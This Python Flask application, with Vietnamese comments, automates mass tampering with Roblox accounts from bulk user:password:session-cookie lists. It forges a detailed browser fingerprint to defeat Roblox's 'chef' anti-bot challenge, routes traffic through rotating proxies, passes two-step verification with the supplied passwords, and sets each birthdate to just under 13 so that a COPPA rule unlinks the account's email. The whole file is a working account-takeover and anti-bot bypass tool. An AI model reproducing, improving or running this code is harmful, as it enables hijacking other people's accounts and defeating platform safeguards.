import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import date, datetime, timedelta
import html as html_lib
import json
import os
import queue
import random
import re
import threading
import time

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from flask import Flask, Response, render_template, request, stream_with_context
import requests

app = Flask(__name__)

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
)


def now_str() -> str:
    return datetime.now().strftime("%H:%M:%S")


def produce_protected_payload(public_key_b64: str, payload: dict) -> dict:
    aes_key = os.urandom(32)
    rsa_der = base64.b64decode(public_key_b64)
    public_key = serialization.load_der_public_key(rsa_der, backend=default_backend())

    wrapped_key = public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None,
        ),
    )

    iv = os.urandom(12)
    encryptor = Cipher(
        algorithms.AES(aes_key),
        modes.GCM(iv),
        backend=default_backend(),
    ).encryptor()

    plaintext = json.dumps(payload).encode("utf-8")
    ciphertext = encryptor.update(plaintext) + encryptor.finalize() + encryptor.tag

    return {
        "data": base64.b64encode(wrapped_key).decode(),
        "eventPayload": base64.b64encode(ciphertext).decode(),
        "ivBase64Enc": base64.b64encode(iv).decode(),
    }


def solve_fingerprint(challenge_token: str, symbol_entry: str) -> dict:
    fingerprint_data = {
        "symbolEntry": symbol_entry,
        "events": [
            {
                "audio": {"sampleHash": 1168.9068228197468, "oscillator": "sine", "maxChannels": 1, "channelCountMode": "max"},
                "canvas": {"commonImageDataHash": "6999abd310347a74500b74b30bb97077"},
                "fonts": {
                    "Arial Black": 531.9140625, "Calibri": 420.046875, "Candara": 435.4453125,
                    "Comic Sans MS": 462.4453125, "Constantia": 469.86328125, "Courier": 432.0703125,
                    "Courier New": 432.0703125, "Franklin Gothic Medium": 431.82421875,
                    "Georgia": 475.2421875, "Impact": 395.54296875, "Lucida Console": 433.828125,
                    "Lucida Sans Unicode": 472.0078125, "Segoe Print": 514.30078125,
                    "Segoe Script": 525.234375, "Segoe UI": 450, "Tahoma": 432.45703125,
                    "Trebuchet MS": 428.90625, "Verdana": 486.5625,
                },
                "hardware": {
                    "videocard": {
                        "vendor": "WebKit",
                        "renderer": "WebKit WebGL",
                        "version": "WebGL 1.0 (OpenGL ES 2.0 Chromium)",
                        "shadingLanguageVersion": "WebGL GLSL ES 1.0 (OpenGL ES GLSL ES 1.0 Chromium)",
                    },
                    "architecture": 255,
                    "deviceMemory": "8",
                    "jsHeapSizeLimit": 4294705152,
                },
                "locales": {"languages": "en-US", "timezone": "America/Chicago"},
                "permissions": {
                    "accelerometer": "granted", "backgroundFetch": "granted", "backgroundSync": "granted",
                    "camera": "prompt", "clipboardRead": "prompt", "clipboardWrite": "granted",
                    "displayCapture": "prompt", "gyroscope": "granted", "geolocation": "prompt",
                    "localFonts": "prompt", "magnetometer": "granted", "microphone": "prompt",
                    "midi": "prompt", "notifications": "prompt", "paymentHandler": "granted",
                    "persistentStorage": "prompt", "storageAccess": "granted", "windowManagement": "prompt",
                },
                "plugins": {
                    "plugins": [
                        "PDF Viewer|internal-pdf-viewer|Portable Document Format",
                        "Chrome PDF Viewer|internal-pdf-viewer|Portable Document Format",
                        "Chromium PDF Viewer|internal-pdf-viewer|Portable Document Format",
                        "Microsoft Edge PDF Viewer|internal-pdf-viewer|Portable Document Format",
                        "WebKit built-in PDF|internal-pdf-viewer|Portable Document Format",
                    ]
                },
                "screen": {
                    "is_touchscreen": False,
                    "maxTouchPoints": 0,
                    "colorDepth": 24,
                    "mediaMatches": [
                        "prefers-contrast: no-preference", "any-hover: hover", "any-pointer: fine",
                        "pointer: fine", "hover: hover", "update: fast",
                        "prefers-reduced-motion: no-preference", "prefers-reduced-transparency: no-preference",
                        "scripting: enabled", "forced-colors: none",
                    ],
                },
                "system": {
                    "platform": "Win32",
                    "cookieEnabled": True,
                    "productSub": "20030107",
                    "product": "Gecko",
                    "useragent": USER_AGENT,
                    "hardwareConcurrency": 12,
                    "browser": {"name": "Chrome", "version": "145.0"},
                    "applePayVersion": 0,
                },
                "webgl": {"commonImageHash": "3a4ed1c6378f68583893dd719f84f6c9"},
                "math": {
                    "acos": 1.0471975511965979, "asin": -9.614302481290016e-17,
                    "atan": 4.578239276804769e-17, "cos": -4.854249971455313e-16,
                    "cosh": 1.9468519159297506, "e": 2.718281828459045,
                    "largeCos": 0.7639704044417283, "largeSin": -0.6452512852657808,
                    "largeTan": -0.8446024630198843, "log": 6.907755278982137,
                    "pi": 3.141592653589793, "sin": -1.9461946644816207e-16,
                    "sinh": -0.6288121810679035, "sqrt": 1.4142135623730951,
                    "tan": 6.980860926542689e-14, "tanh": -0.39008295789884684,
                },
                "data_latency_ms": 156.9,
            }
        ],
        "metrics": [],
    }

    f_payload = {
        "symbolEntry": symbol_entry,
        "events": [json.dumps(fingerprint_data)],
        "metrics": [],
    }
    return produce_protected_payload(challenge_token, f_payload)


def get_base_headers(csrf: str = "") -> dict:
    trace_id = os.urandom(16).hex()
    parent_id = os.urandom(8).hex()
    h = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json;charset=UTF-8",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "traceparent": f"00-{trace_id}-{parent_id}-00",
    }
    if csrf:
        h["x-csrf-token"] = csrf
    return h


def get_csrf_and_user_id(session: requests.Session):
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
    }
    resp = session.get("https://www.roblox.com/my/account#!/info", headers=headers, timeout=20)
    user_id = re.search(r'data-userid="(\d+)"', resp.text)
    csrf = re.search(r'<meta\s+name=["\']csrf-token["\']\s+data-token=["\']([^"\']+)["\']', resp.text)
    if not user_id:
        return None, ""
    uid = user_id.group(1)
    csrf_token = html_lib.unescape(csrf.group(1)) if csrf else ""
    return uid, csrf_token


def post_birthdate(session: requests.Session, csrf: str, b_month: int, b_day: int, b_year: int, challenge_headers: dict | None = None):
    headers = get_base_headers(csrf)
    if challenge_headers:
        headers.update(challenge_headers)
    body_json = json.dumps(
        {"birthMonth": b_month, "birthDay": b_day, "birthYear": b_year},
        separators=(",", ":"),
    )
    return session.post("https://users.roblox.com/v1/birthdate", headers=headers, data=body_json, timeout=25)


def solve_chef_challenge_sync(session: requests.Session, csrf: str, rblx_challenge_id: str, identifiers: list, user_id: str, btid: str) -> bool:
    headers_fetch = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

    resp1 = session.get(
        f"https://apis.roblox.com/rotating-client-service/v1/fetch?challengeId={rblx_challenge_id}&identifier={identifiers[0]}",
        headers=headers_fetch,
        timeout=20,
    )
    data1 = base64.b64decode(resp1.text).decode()
    tok1 = re.search(r'produceProtectedPayload\s*\(\s*"([^"]+)"', data1).group(1)
    sym1 = re.search(r'expectedSymbol="([^"]+)"', data1).group(1)
    s1 = solve_fingerprint(tok1, sym1)

    resp2 = session.get(
        f"https://apis.roblox.com/rotating-client-service/v1/fetch?challengeId={rblx_challenge_id}&identifier={identifiers[1]}",
        headers=headers_fetch,
        timeout=20,
    )
    data2 = base64.b64decode(resp2.text).decode()
    tok2 = re.search(r'produceProtectedPayload\s*\(\s*"([^"]+)"', data2).group(1)
    sym2 = re.search(r'expectedSymbol="([^"]+)"', data2).group(1)
    s2 = solve_fingerprint(tok2, sym2)

    headers_submit = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://www.roblox.com/",
        "Content-Type": "application/json-patch+json",
        "x-csrf-token": csrf,
        "Origin": "https://www.roblox.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

    p1 = {"userId": str(user_id), "challengeId": rblx_challenge_id, "payloadV2": s1["eventPayload"], "params": {"key": s1["data"], "iv": s1["ivBase64Enc"]}, "btid": str(btid)}
    p2 = {"userId": str(user_id), "challengeId": rblx_challenge_id, "payloadV2": s2["eventPayload"], "params": {"key": s2["data"], "iv": s2["ivBase64Enc"]}, "btid": str(btid)}

    r1 = session.post("https://apis.roblox.com/rotating-client-service/v1/submit", headers=headers_submit, data=json.dumps(p1, separators=(",", ":")), timeout=20)
    r2 = session.post("https://apis.roblox.com/rotating-client-service/v1/submit", headers=headers_submit, data=json.dumps(p2, separators=(",", ":")), timeout=20)
    return r1.status_code == 200 and r2.status_code == 200


def continue_challenge(session: requests.Session, csrf: str, rblx_challenge_id: str, challenge_type: str, challenge_metadata: dict):
    headers = get_base_headers(csrf)
    payload = {
        "challengeId": rblx_challenge_id,
        "challengeType": challenge_type,
        "challengeMetadata": json.dumps(challenge_metadata, separators=(",", ":")),
    }
    return session.post("https://apis.roblox.com/challenge/v1/continue", headers=headers, data=json.dumps(payload, separators=(",", ":")), timeout=20)


def verify_password_2sv(session: requests.Session, csrf: str, user_id: str, challenge_id_2sv: str, password: str):
    headers = get_base_headers(csrf)
    payload = {"challengeId": challenge_id_2sv, "actionType": "Generic", "code": password}
    resp = session.post(
        f"https://twostepverification.roblox.com/v1/users/{user_id}/challenges/password/verify",
        headers=headers,
        data=json.dumps(payload, separators=(",", ":")),
        timeout=20,
    )
    if resp.status_code == 200:
        return resp.json().get("verificationToken", "")
    return None


def get_unlink_birthdate() -> tuple[int, int, int]:
    """Ngày sinh < 13 tuổi để trigger COPPA unlink mail."""
    today = date.today()
    dob = today.replace(year=today.year - 13) + timedelta(days=1)
    return dob.month, dob.day, dob.year


def get_random_birthday_18plus() -> tuple[int, int, int]:
    today = date.today()
    age = random.randint(18, 30)
    birth_year = today.year - age
    birth_month = random.randint(1, 12)
    if birth_month in (1, 3, 5, 7, 8, 10, 12):
        max_day = 31
    elif birth_month in (4, 6, 9, 11):
        max_day = 30
    else:
        leap = (birth_year % 4 == 0 and birth_year % 100 != 0) or (birth_year % 400 == 0)
        max_day = 29 if leap else 28
    birth_day = random.randint(1, max_day)
    if (today - date(birth_year, birth_month, birth_day)).days / 365.25 < 18:
        birth_year -= 1
    return birth_month, birth_day, birth_year


def normalize_proxy(raw: str) -> str:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return ""
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        scheme = "socks5" if port in ("1080", "1081") else "http"
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    return f"http://{raw}"


def run_change_birthday(cookie: str, password: str, b_month: int, b_day: int, b_year: int, proxy_url: str = "", on_step=None):
    def step(msg):
        if on_step:
            on_step(msg)

    session = requests.Session()
    if proxy_url:
        session.proxies.update({"http": proxy_url, "https": proxy_url})
    session.cookies.set(".ROBLOSECURITY", cookie)
    session.cookies.set("rbx-ip2", "1")
    btid = str(int(time.time() * 1_000_000))

    step("[1/5] Lấy CSRF & User ID")
    user_id, csrf = get_csrf_and_user_id(session)
    if not user_id:
        return False, "Cookie hết hạn hoặc không lấy được User ID"

    step(f"[2/5] POST birthdate {b_month}/{b_day}/{b_year}")
    resp = post_birthdate(session, csrf, b_month, b_day, b_year)
    if resp.status_code == 403 and "Token Validation Failed" in resp.text:
        csrf = resp.headers.get("x-csrf-token", csrf)
        resp = post_birthdate(session, csrf, b_month, b_day, b_year)

    if resp.status_code == 200:
        return True, f"Đổi thành công ({b_month}/{b_day}/{b_year})"
    if resp.status_code != 403:
        return False, f"Lỗi HTTP {resp.status_code}"

    challenge_type = resp.headers.get("rblx-challenge-type", "")
    rblx_challenge_id = resp.headers.get("rblx-challenge-id", "")
    challenge_metadata_b64 = resp.headers.get("rblx-challenge-metadata", "")
    new_csrf = resp.headers.get("x-csrf-token", "")
    if new_csrf:
        csrf = new_csrf

    if challenge_type != "chef":
        return False, f"Challenge không hỗ trợ: {challenge_type}"

    meta = json.loads(base64.b64decode(challenge_metadata_b64).decode("utf-8"))
    identifiers = meta.get("scriptIdentifiers", [])
    if len(identifiers) < 2:
        return False, "Thiếu Chef script identifiers"

    step("[3/5] Giải Chef challenge")
    if not solve_chef_challenge_sync(session, csrf, rblx_challenge_id, identifiers, user_id, btid):
        return False, "Chef challenge thất bại"

    time.sleep(random.uniform(0.8, 1.6))
    step("[4/5] Continue & verify 2SV password")
    cont_resp = continue_challenge(session, csrf, rblx_challenge_id, "chef", {
        "userId": str(user_id),
        "challengeId": rblx_challenge_id,
        "browserTrackerId": btid,
    })
    if cont_resp.status_code != 200:
        return False, f"Continue chef lỗi ({cont_resp.status_code})"

    cont_data = cont_resp.json()
    next_type = cont_data.get("challengeType", "")
    cont_meta_str = cont_data.get("challengeMetadata", "")

    if next_type == "blocksession":
        return False, "Bị blocksession (AutomatedTampering)"

    final_hdrs = {
        "rblx-challenge-id": rblx_challenge_id,
        "rblx-challenge-metadata": challenge_metadata_b64,
        "rblx-challenge-type": "chef",
    }

    if next_type == "twostepverification":
        tsv_raw = json.loads(cont_meta_str) if cont_meta_str else {}
        challenge_id_2sv = tsv_raw.get("challengeId", "")
        if not challenge_id_2sv:
            return False, "Không có 2SV challengeId"

        ver_token = verify_password_2sv(session, csrf, user_id, challenge_id_2sv, password)
        if not ver_token:
            return False, "Sai password 2SV hoặc verify lỗi"

        tsv_meta = {
            "verificationToken": ver_token,
            "rememberDevice": False,
            "challengeId": challenge_id_2sv,
            "actionType": "Generic",
        }
        cont2 = continue_challenge(session, csrf, rblx_challenge_id, "twostepverification", tsv_meta)
        if cont2.status_code != 200:
            return False, f"Continue 2SV lỗi ({cont2.status_code})"

        final_meta_b64 = base64.b64encode(json.dumps(tsv_meta, separators=(",", ":")).encode()).decode()
        final_hdrs = {
            "rblx-challenge-id": rblx_challenge_id,
            "rblx-challenge-metadata": final_meta_b64,
            "rblx-challenge-type": "chef",
            "x-retry-attempt": "1",
        }

    step("[5/5] Xác nhận cập nhật birthdate")
    time.sleep(random.uniform(1.2, 2.2))
    resp_final = post_birthdate(session, csrf, b_month, b_day, b_year, final_hdrs)
    if resp_final.status_code == 200:
        return True, f"Thành công ({b_month}/{b_day}/{b_year})"

    retry_csrf = resp_final.headers.get("x-csrf-token", "")
    if retry_csrf and retry_csrf != csrf:
        resp_retry = post_birthdate(session, retry_csrf, b_month, b_day, b_year, final_hdrs)
        if resp_retry.status_code == 200:
            return True, f"Thành công sau retry ({b_month}/{b_day}/{b_year})"
        return False, f"Thất bại ({resp_retry.status_code})"

    return False, f"Thất bại ({resp_final.status_code})"


def parse_accounts(raw_text: str) -> list[tuple[str, str, str]]:
    out = []
    for line in raw_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 2)
        if len(parts) < 3:
            continue
        u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
        if u and c:
            out.append((u, p, c))
    return out


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/unlinkmail", methods=["POST"])
def api_unlinkmail():
    payload = request.get_json(force=True)
    accounts = parse_accounts(payload.get("accounts", ""))
    proxies = [p for p in (normalize_proxy(x) for x in payload.get("proxies", "").splitlines()) if p]
    dob_mode = payload.get("dobMode", "unlink13")
    threads = max(1, min(20, int(payload.get("threads", 5))))

    def stream():
        if not accounts:
            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không có account hợp lệ (user:pass:cookie)'})}\n\n"
            return

        q = queue.Queue()
        total = len(accounts)

        def push(ev_type, **kw):
            kw["type"] = ev_type
            kw["time"] = now_str()
            q.put(kw)

        def worker(u: str, p: str, c: str):
            b_m, b_d, b_y = get_unlink_birthdate() if dob_mode == "unlink13" else get_random_birthday_18plus()
            px = random.choice(proxies) if proxies else ""
            push("log", level="INFO", msg=f"{u} | DOB={b_m}/{b_d}/{b_y}")
            ok, msg = run_change_birthday(
                c, p, b_m, b_d, b_y, px,
                on_step=lambda m: push("log", level="STEP", msg=f"{u} | {m}"),
            )
            if ok:
                push("success", username=u, line=f"{u}:{p}:{c}", msg=msg)
            else:
                push("fail", username=u, line=f"{u}:{p}:{c} | {msg}", msg=msg)

        def runner():
            push("start", total=total)
            push("log", level="INFO", msg=f"Bắt đầu {total} accs · mode={dob_mode} · {len(proxies)} proxies · {min(threads, total)} threads")
            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
                futs = [pool.submit(worker, u, p, c) for (u, p, c) in accounts]
                for f in as_completed(futs):
                    try:
                        f.result()
                    except Exception as e:
                        push("log", level="ERR", msg=f"Lỗi thread: {e}")
            push("done")

        threading.Thread(target=runner, daemon=True).start()

        while True:
            item = q.get()
            yield f"data: {json.dumps(item)}\n\n"
            if item.get("type") in ("done", "error"):
                break

    return Response(stream_with_context(stream()), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
